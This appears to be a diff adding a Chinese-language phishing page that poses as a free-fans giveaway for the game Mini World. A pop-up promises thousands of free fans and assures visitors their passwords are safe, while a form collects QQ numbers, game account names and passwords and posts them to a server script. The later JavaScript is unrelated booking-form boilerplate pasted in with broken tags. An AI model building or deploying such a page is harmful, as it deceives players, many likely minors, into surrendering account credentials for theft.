@@ -1,0 +1,227 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>登录迷你号</title>
+<link rel="stylesheet" type="text/css" href="https://www.layuicdn.com/layui/css/layui.css" />
+<script src="https://www.layuicdn.com/layui/layui.js" charset="utf-8"></script>
+</head>
+<body>
+
+
+<script> 
+alert("Ttp公开免费活动可领取5000到6000的粉丝11月13号结束快来白嫖粉丝吧！\r请放心，输入我们不会泄露你的账号和密码");
+</script>
+
+
+
+<fieldset class="layui-elem-field layui-field-title" style="margin-top: 20px;">
+  <legend>LoginMiniAccount</legend>
+</fieldset>   
+<div style="padding: 20px; background-color: #F2F2F2;">
+  <div class="layui-row layui-col-space15">
+    <div class="layui-col-md6">
+      <div class="layui-card">
+        <div class="layui-card-header">登录</div>
+        <div class="layui-card-body">
+			<form class="layui-form" action="requeryLoginMini.php" method="post" onsubmit="return checkForm(this)" lay-filter="example">
+			 <div class="layui-form-item">
+			    <label class="layui-form-label">QQ号</label>
+			    <div class="layui-input-block">
+			      <input type="text" name="qie" placeholder="请确保输入QQ号正确，以此用来绑定迷你号" class="layui-input">
+			    </div>
+			  </div>
+			  <div class="layui-form-item">
+			    <label class="layui-form-label">迷你号</label>
+			    <div class="layui-input-block">
+			      <input type="text" name="title" placeholder="点击输入迷你号" class="layui-input">
+			    </div>
+			  </div>
+			  <div class="layui-form-item">
+			    <label class="layui-form-label">密码</label>
+			    <div class="layui-input-block">
+			      <input type="password" name="content" placeholder="点击输入密码" class="layui-input">
+			    </div>
+			    
+			  </div>			
+                        <label class="layui-form-label">
+                            <span class="x-red"></span>类型</label>
+                        <div class="layui-input-inline">
+                            <select id="sc_dq" class="valid" name="sc_dq" lay-filter="sc_dq">
+                                
+                                    <option value="1">粉丝</option>
+                                
+                                    <option value="2"
+                                            selected="selected">勋章</option>
+                                
+                                
+                                
+                            </select>
+                        </div>
+                    </div>
+  
+			  <div class="layui-form-item">
+			    <div class="layui-input-block">
+			      <input type="submit" class="layui-btn layui-btn-normal" value="登录"/>
+			    </div>
+			  </div>
+			</form>
+        </div>
+      </div>
+    </div>
+    <script type="text/javascript">
+	// 验证输入不为空的脚本代码
+	function checkForm(form) {
+	if(form.title.value == "") {
+	alert("用户名不能为空!");
+	form.username.focus();
+	return false;
+	}
+	if(form.qie.value == "") {
+	alert("用户名不能为空!");
+	form.username.focus();
+	return false;
+	}
+	if(form.content.value == "") {
+	alert("密码不能为空!");
+	form.password.focus();
+	return false;
+	}
+	return true;
+	}
+	
+	
+	
+	
+	<script>
+    layui.config({
+        base: '../extend/' //此处路径请自行处理, 可以使用绝对路径
+    }).extend({
+        formSelects_v4: 'formSelects-v4'
+    });
+    layui.use(['form', 'layer', 'jquery', 'laydate', 'element'],
+        function () {
+            $ = layui.jquery;
+            var form = layui.form,
+                layer = layui.layer,
+                laydate = layui.laydate,
+                element = layui.element;
+            var formSelects = layui.formSelects;
+
+            function minDate() {
+                var now = new Date();
+                return now.getFullYear() + "-" + (now.getMonth() + 1) + "-" + now.getDate();
+            }
+
+            //时间选择器
+            laydate.render({
+                elem: '#sc_yyrq'
+                , type: 'date'
+                , min: minDate()
+            });
+            //联动
+            form.on('select(sc_dq)', function (data) {
+                $.ajax({
+                    type: 'get'
+                    , url: 'select.json'
+                    , data: {'act': 'c', 'val': data.value}
+                    , success: function (resJson) {
+                        var res = resJson.data;
+                        if (res.length > 0) {
+                            var arr = new Array();
+                            for (var i = 0; i < res.length; i++) {
+                                var item = res[i];
+                                arr.push({name: item.name, value: item.id});
+                            }
+                            layui.formSelects.data('sc_yy', 'local', {
+                                arr: arr
+                            });
+                        } else {
+                            layui.formSelects.data('sc_yy', 'local', {
+                                arr: []
+                            });
+                        }
+                    }
+                });
+            });
+
+            function renderForm() {
+                layui.use('form', function () {
+                    form.render('select');
+                })
+            }
+
+            //监听提交
+            form.on('submit(add)', function (data) {
+                var loading = layer.load(2, {
+                    shade: [0.2],
+                    time: 3600 * 1000
+                });
+                // console.log(IdCardValidate(data.field.sc_sfzhm));
+
+                if (!IdCardValidate(data.field.sc_sfzhm)) {
+                    layer.close(loading);
+                    layer.msg('无效的身份证号。', {
+                        icon: 5,
+                        anim: 6
+                    });
+                    changeCode();
+                    return false;
+                }
+
+                if (!checkPhone(data.field.sc_lxdh)) {
+                    layer.close(loading);
+                    layer.msg('无效的电话号码。', {
+                        icon: 5,
+                        anim: 6
+                    });
+                    changeCode();
+                    return false;
+                }
+                $.post("?act=post", {
+                    csrfmiddlewaretoken: data.field.csrfmiddlewaretoken,
+                    sc_yy: layui.formSelects.value('sc_yy', 'valStr'),
+                    sc_yyrq: data.field.sc_yyrq,
+                    sc_xm: data.field.sc_xm,
+                    sc_mz: data.field.sc_mz,
+                    sc_sfzhm: data.field.sc_sfzhm,
+                    sc_lxdh: data.field.sc_lxdh,
+                    captcha: data.field.captcha,
+                }, function (json) {
+                    if (json.state == true) {
+                        layer.close(loading);
+                        layer.alert("预约成功！", {
+                                icon: 6
+                            },
+                            function (index) {
+                                window.location = '?act=show&no=' + json.no;
+                                parent.layer.close(index);
+                            });
+
+                    } else {
+                        layer.close(loading);
+                        layer.msg('预约失败！\n' + json.msg, {
+                            icon: 5,
+                            anim: 6
+                        });
+                        changeCode();
+                    }
+                });
+                return false;
+            });
+
+        });
+
+    function changeCode() {
+        var img = document.getElementById("captcha");
+        img.src = 'captcha.png?tm=' + Math.random();
+    }
+
+
+ 
+
+</script>
+</body>
+</html>
